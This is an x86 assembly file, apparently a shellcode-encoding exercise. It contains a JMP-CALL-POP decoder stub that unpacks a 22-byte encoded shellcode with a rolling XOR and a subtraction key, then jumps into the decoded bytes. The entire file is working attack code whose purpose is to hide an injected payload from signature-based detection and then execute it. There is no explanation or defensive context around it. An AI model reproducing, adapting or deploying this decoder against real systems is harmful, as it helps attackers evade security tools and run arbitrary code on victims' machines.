global _start

section .text
_start:
    jmp short starter             ; JMP CALL POP technique

decoder:
    pop esi                 ; Store the shellcode in ESI

    xor eax, eax            ; zeroed EAX
    xor ebx, ebx            ; zeroed EBX
    xor ecx, ecx            ; zeroed ECX

    mov byte cl, 22         ; Lenght of shellcode
    mov byte al, 0x66       ; First value = 102
    mov byte bl, 0x2a       ; Key = 42

decode:
    mov dl, [esi]           ; DL = shellcode byte
    xor al, dl              ; XOR process
    mov [esi], al           ; Change the value of the shellcode byte
    sub byte [esi], bl      ; ROT 
    mov al, dl              ; Rolling XOR
    inc esi                 ; Next shellcode byte
    loop decode             ; Loop until ECX = 0

    jmp shellcode           ; JMP to our shellcode

starter:
    call decoder
    shellcode: db 0x3d, 0xd7, 0xad, 0x1e, 0x12, 0x80, 0xd9, 0x80, 0x1d, 0x8f, 0x1d, 0x44, 0xc8, 0x5b, 0xc3, 0x70, 0x7d, 0x07, 0xdd, 0xe8, 0x1f, 0xb5
